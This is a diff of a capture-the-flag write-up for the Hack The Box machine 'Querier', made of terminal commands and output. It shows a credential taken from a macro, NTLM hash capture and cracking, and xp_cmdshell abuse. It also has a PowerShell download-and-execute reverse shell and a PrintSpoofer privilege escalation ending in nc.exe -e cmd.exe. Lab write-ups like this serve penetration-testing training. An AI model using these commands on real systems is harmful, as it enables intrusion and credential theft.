@@ -1,91 +1,12 @@
 # Querier
 
-## Nmap Results
+## Pre Foothold
 
 ```
 ┌──[Fri Nov  4 09:23:39 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting/oscp]
 └──# rscan $ip
 rustscan --accessible -u 5000 -b 2500 -a 10.129.13.248 -- -Pn -A
-
-Automatically increasing ulimit value to 5000.
-Open 10.129.13.248:135
-Open 10.129.13.248:139
-Open 10.129.13.248:445
-Open 10.129.13.248:1433
-Open 10.129.13.248:5985
-Open 10.129.13.248:47001
-Open 10.129.13.248:49665
-Open 10.129.13.248:49667
-Open 10.129.13.248:49666
-Open 10.129.13.248:49664
-Open 10.129.13.248:49668
-Open 10.129.13.248:49670
-Open 10.129.13.248:49669
-Open 10.129.13.248:49671
-Starting Script(s)
-Running script "nmap -vvv -p {{port}} {{ip}} -Pn -A" on ip 10.129.13.248
-Depending on the complexity of the script, results may take some time to appear.
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-04 21:23 CDT
-NSE: Loaded 155 scripts for scanning.
-NSE: Script Pre-scanning.
-NSE: Starting runlevel 1 (of 3) scan.
-Initiating NSE at 21:23
-Completed NSE at 21:23, 0.00s elapsed
-NSE: Starting runlevel 2 (of 3) scan.
-Initiating NSE at 21:23
-Completed NSE at 21:23, 0.00s elapsed
-NSE: Starting runlevel 3 (of 3) scan.
-Initiating NSE at 21:23
-Completed NSE at 21:23, 0.00s elapsed
-Initiating Parallel DNS resolution of 1 host. at 21:23
-Completed Parallel DNS resolution of 1 host. at 21:23, 0.00s elapsed
-DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
-Initiating SYN Stealth Scan at 21:23
-Scanning 10.129.13.248 [14 ports]
-Discovered open port 445/tcp on 10.129.13.248
-Discovered open port 135/tcp on 10.129.13.248
-Discovered open port 49668/tcp on 10.129.13.248
-Discovered open port 49669/tcp on 10.129.13.248
-Discovered open port 139/tcp on 10.129.13.248
-Discovered open port 49665/tcp on 10.129.13.248
-Discovered open port 49666/tcp on 10.129.13.248
-Discovered open port 1433/tcp on 10.129.13.248
-Discovered open port 5985/tcp on 10.129.13.248
-Discovered open port 49671/tcp on 10.129.13.248
-Discovered open port 49664/tcp on 10.129.13.248
-Discovered open port 49667/tcp on 10.129.13.248
-Discovered open port 47001/tcp on 10.129.13.248
-Discovered open port 49670/tcp on 10.129.13.248
-Completed SYN Stealth Scan at 21:23, 0.29s elapsed (14 total ports)
-Initiating Service scan at 21:23
-Scanning 14 services on 10.129.13.248
-Service scan Timing: About 50.00% done; ETC: 21:25 (0:00:56 remaining)
-Completed Service scan at 21:24, 56.49s elapsed (14 services on 1 host)
-Initiating OS detection (try #1) against 10.129.13.248
-Retrying OS detection (try #2) against 10.129.13.248
-Initiating Traceroute at 21:24
-Completed Traceroute at 21:24, 0.11s elapsed
-Initiating Parallel DNS resolution of 2 hosts. at 21:24
-Completed Parallel DNS resolution of 2 hosts. at 21:24, 0.04s elapsed
-DNS resolution of 2 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
-NSE: Script scanning 10.129.13.248.
-NSE: Starting runlevel 1 (of 3) scan.
-Initiating NSE at 21:24
-Completed NSE at 21:25, 8.85s elapsed
-NSE: Starting runlevel 2 (of 3) scan.
-Initiating NSE at 21:25
-Completed NSE at 21:25, 0.70s elapsed
-NSE: Starting runlevel 3 (of 3) scan.
-Initiating NSE at 21:25
-Completed NSE at 21:25, 0.00s elapsed
-Nmap scan report for 10.129.13.248
-Host is up, received user-set (0.12s latency).
-Scanned at 2022-11-04 21:23:54 CDT for 70s
-
-PORT      STATE SERVICE       REASON          VERSION
-135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+...
 445/tcp   open  microsoft-ds? syn-ack ttl 127
 1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000.00; RTM
 | ms-sql-ntlm-info: 
@@ -125,87 +46,317 @@ PORT      STATE SERVICE       REASON          VERSION
 | 916RTA==
 |_-----END CERTIFICATE-----
 |_ssl-date: 2022-11-05T02:25:03+00:00; -1s from scanner time.
-5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
-Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%)
-No exact OS matches for host (test conditions non-ideal).
-TCP/IP fingerprint:
-SCAN(V=7.92%E=4%D=11/4%OT=135%CT=%CU=35637%PV=Y%DS=2%DC=T%G=N%TM=6365C980%P=x86_64-pc-linux-gnu)
-SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)
-OPS(O1=M53ANW8NNS%O2=M53ANW8NNS%O3=M53ANW8%O4=M53ANW8NNS%O5=M53ANW8NNS%O6=M53ANNS)
-WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
-ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53ANW8NNS%CC=Y%Q=)
-T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
-T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
-T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
-T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
-T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
-T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
-T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
-U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
-IE(R=Y%DFI=N%T=80%CD=Z)
-
-Network Distance: 2 hops
-TCP Sequence Prediction: Difficulty=262 (Good luck!)
-IP ID Sequence Generation: Incremental
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|_clock-skew: mean: 0s, deviation: 0s, median: 0s
-| ms-sql-info: 
-|   10.129.13.248:1433: 
-|     Version: 
-|       name: Microsoft SQL Server 2017 RTM
-|       number: 14.00.1000.00
-|       Product: Microsoft SQL Server 2017
-|       Service pack level: RTM
-|       Post-SP patches applied: false
-|_    TCP port: 1433
-| p2p-conficker: 
-|   Checking for Conficker.C or higher...
-|   Check 1 (port 11672/tcp): CLEAN (Couldn't connect)
-|   Check 2 (port 31567/tcp): CLEAN (Couldn't connect)
-|   Check 3 (port 61047/udp): CLEAN (Failed to receive data)
-|   Check 4 (port 64435/udp): CLEAN (Timeout)
-|_  0/4 checks are positive: Host is CLEAN or ports are blocked
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2022-11-05T02:24:59
-|_  start_date: N/A
-
-TRACEROUTE (using port 445/tcp)
-HOP RTT       ADDRESS
-1   101.44 ms 10.10.16.1
-2   50.41 ms  10.129.13.248
-
-NSE: Script Post-scanning.
-NSE: Starting runlevel 1 (of 3) scan.
-Initiating NSE at 21:25
-Completed NSE at 21:25, 0.00s elapsed
-NSE: Starting runlevel 2 (of 3) scan.
-Initiating NSE at 21:25
-Completed NSE at 21:25, 0.00s elapsed
-NSE: Starting runlevel 3 (of 3) scan.
-Initiating NSE at 21:25
-Completed NSE at 21:25, 0.00s elapsed
-Read data files from: /usr/bin/../share/nmap
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 70.49 seconds
-           Raw packets sent: 56 (3.892KB) | Rcvd: 49 (3.328KB)
+...
 ```
+
+```
+┌──[Fri Nov  4 11:08:20 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/opt]
+└──# smbclient -N -L //$ip/reports
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	Reports         Disk
+```
+
+```
+┌──[Fri Nov  4 11:30:17 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp]
+└──# smbclient -N //$ip/reports
+smb: \> mget *
+Get file Currency Volume Report.xlsm? y
+getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (20.1 KiloBytes/sec) (average 20.1 KiloBytes/sec)
+```
+
+```
+┌──[Fri Nov  4 11:43:24 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp/report]
+└──# unzip Currency\ Volume\ Report.xlsm 
+Archive:  Currency Volume Report.xlsm
+  inflating: [Content_Types].xml     
+  inflating: _rels/.rels             
+  inflating: xl/workbook.xml         
+  inflating: xl/_rels/workbook.xml.rels  
+  inflating: xl/worksheets/sheet1.xml  
+  inflating: xl/theme/theme1.xml     
+  inflating: xl/styles.xml           
+  inflating: xl/vbaProject.bin       
+  inflating: docProps/core.xml       
+  inflating: docProps/app.xml
+```
+
+```
+┌──[Fri Nov  4 11:57:20 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp/report/xl]
+└──# strings vbaProject.bin
+ macro to pull data for client volume reports
+n.Conn]
+Open 
+rver=<
+SELECT * FROM volume;
+word>
+ MsgBox "connection successful"
+Set rs = conn.Execute("SELECT * @@version;")
+Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
+...
+```
+
+```
+┌──[Sat Nov  5 12:17:22 AM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp/report/xl]
+└──# /opt/Responder-3.1.3.0/Responder.py -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -> https://www.patreon.com/PythonResponder
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+...
+[+] Listening for events...
+```
+
+```
+┌──[Sat Nov  5 12:13:00 AM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp]
+└──# mssqlclient.py reporting@$ip -windows-auth
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+SQL> exec xp_dirtree '\\10.10.16.2\share\',1,1
+subdirectory                                                                                                                                                                                                                                                            depth          file   
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   -----------   
+
+SQL> exit
+```
+
+```
+[SMB] NTLMv2-SSP Client   : 10.129.13.248
+[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
+[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:5e0e30237fdcb215:6966C8CD41CCD821A7686EA3575F454E:0101000000000000809815FBABF0D801074BD07C4B2F8FB900000000020008003400480042004D0001001E00570049004E002D0051004A00520053005600500041004D0049003900560004003400570049004E002D0051004A00520053005600500041004D004900390056002E003400480042004D002E004C004F00430041004C00030014003400480042004D002E004C004F00430041004C00050014003400480042004D002E004C004F00430041004C0007000800809815FBABF0D80106000400020000000800300030000000000000000000000000300000289CB1AE9150018EB14C694EA581C2691E3718EA27AD27D2CA122143625866E40A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003200000000000000000000000000
+```
+
+```
+┌──[Sat Nov  5 12:29:46 AM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp/report]
+└──# hashcat -d 2 hash.txt -m 5600 --wordlist /usr/share/wordlists/rockyou.txt        
+...
+MSSQL-SVC::QUERIER:5e0e30237fdcb215:6966c8cd41ccd821a7686ea3575f454e:0101000000000000809815fbabf0d801074bd07c4b2f8fb900000000020008003400480042004d0001001e00570049004e002d0051004a00520053005600500041004d0049003900560004003400570049004e002d0051004a00520053005600500041004d004900390056002e003400480042004d002e004c004f00430041004c00030014003400480042004d002e004c004f00430041004c00050014003400480042004d002e004c004f00430041004c0007000800809815fbabf0d80106000400020000000800300030000000000000000000000000300000289cb1ae9150018eb14c694ea581c2691e3718ea27ad27d2ca122143625866e40a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003200000000000000000000000000:corporate568
+```
+
+```
+┌──[Sat Nov  5 03:18:20 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp]
+└──# mssqlclient.py mssql-svc:corporate568@$ip -windows-auth
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+SQL> select IS_SRVROLEMEMBER ('sysadmin')
+              
+
+-----------   
+
+          1   
+
+SQL> sp_configure 'xp_cmdshell', '1'
+[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE
+SQL> EXEC master..xp_cmdshell 'whoami'
+output                                                                                                                                                                                                                                                            
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
+
+querier\mssql-svc                                                                                                                                                                                                                                                 
+
+NULL                                                                                                                                                                                                                                                              
+```
+
+```
+┌──[Sat Nov  5 06:15:15 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting/hackthebox]
+└──# tail /opt/winreconpack/Invoke-PowerShellTcp.ps1
+...
+Invoke-PowerShellTcp -Reverse -IPAddress "10.10.16.2" -Port "443"
+```
+
+
+```
+┌──[Sat Nov  5 04:01:42 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting]
+└──# python3 -m http.server 80 -d /opt/winreconpack
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+```
+┌──[Sat Nov  5 04:00:22 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester]
+└──# nc -lnvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+```
+
+```
+SQL> xp_cmdshell powershell iex(new-object net.webclient).downloadstring(\"http://10.10.16.2/Invoke-PowerShellTcp.ps1\")
+```
+
+```
+┌──[Sat Nov  5 04:01:42 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting]
+└──# python3 -m http.server 80 -d /opt/winreconpack
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.13.248 - - [05/Nov/2022 16:01:53] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
+```
+
+```
+┌──[Sat Nov  5 04:00:22 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester]
+└──# nc -lnvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.129.13.248.
+Ncat: Connection from 10.129.13.248:49682.
+Windows PowerShell running as user mssql-svc on QUERIER
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>
+```
+
+## Privilege Escalation
+
+```
+PS C:\Windows\system32> systeminfo
+
+Host Name:                 QUERIER
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+...
+System Type:               x64-based PC
+...
+```
+
+```
+PS C:\Windows\system32> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+...
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+...
+```
+
+```
+PS C:\Windows\system32> net use \\10.10.16.2\winreconpack /user:smbuser smbuser
+The command completed successfully.
+```
+
+```
+PS C:\ProgramData> copy \\10.10.16.2\winreconpack\printspoofer.exe
+```
+
+```
+PS C:\ProgramData> copy \\10.10.16.2\winreconpack\nc.exe
+```
+
+```
+┌──[Sat Nov  5 04:38:51 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp]
+└──# nc -lnvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+```
+
+```
+PS C:\ProgramData> .\printspoofer.exe -c "C:\programdata\nc.exe 10.10.16.2 443 -e cmd.exe" -i
+```
+
+```
+┌──[Sat Nov  5 04:38:51 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp]
+└──# nc -lnvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.129.13.248.
+Ncat: Connection from 10.129.13.248:49689.
+Microsoft Windows [Version 10.0.17763.292]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+## Root Proof
+
+```
+C:\Windows\system32>hostname && whoami && type root.txt && ipconfig /all
+hostname && whoami && type root.txt && ipconfig /all
+QUERIER
+nt authority\system
+The system cannot find the file specified.
+
+C:\Windows\system32>cd C:\users\administrator\desktop
+cd C:\users\administrator\desktop
+
+C:\Users\Administrator\Desktop>hostname && whoami && type root.txt && ipconfig /all
+hostname && whoami && type root.txt && ipconfig /all
+QUERIER
+nt authority\system
+d4c1de8448a7a44efc9f25d87d6d44e3
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : QUERIER
+   Primary Dns Suffix  . . . . . . . : HTB.LOCAL
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : HTB.LOCAL
+                                       htb
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-B9-A0-AC
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   IPv6 Address. . . . . . . . . . . : dead:beef::186(Preferred) 
+   Lease Obtained. . . . . . . . . . : Saturday, November 5, 2022 2:18:09 AM
+   Lease Expires . . . . . . . . . . : Saturday, November 5, 2022 11:18:28 PM
+   IPv6 Address. . . . . . . . . . . : dead:beef::8cc1:dc7e:539:ac36(Preferred) 
+   Link-local IPv6 Address . . . . . : fe80::8cc1:dc7e:539:ac36%13(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 10.129.13.248(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Lease Obtained. . . . . . . . . . : Saturday, November 5, 2022 2:18:09 AM
+   Lease Expires . . . . . . . . . . : Saturday, November 5, 2022 11:18:30 PM
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%13
+                                       10.129.0.1
+   DHCP Server . . . . . . . . . . . : 10.129.0.1
+   DHCPv6 IAID . . . . . . . . . . . : 369119318
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-F7-80-38-00-50-56-B9-A0-AC
+   DNS Servers . . . . . . . . . . . : 1.1.1.1
+                                       8.8.8.8
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+   Connection-specific DNS Suffix Search List :
+                                       htb
+
+C:\Users\Administrator\Desktop>
+```
+
+![[Pasted image 20221105185353.png]]
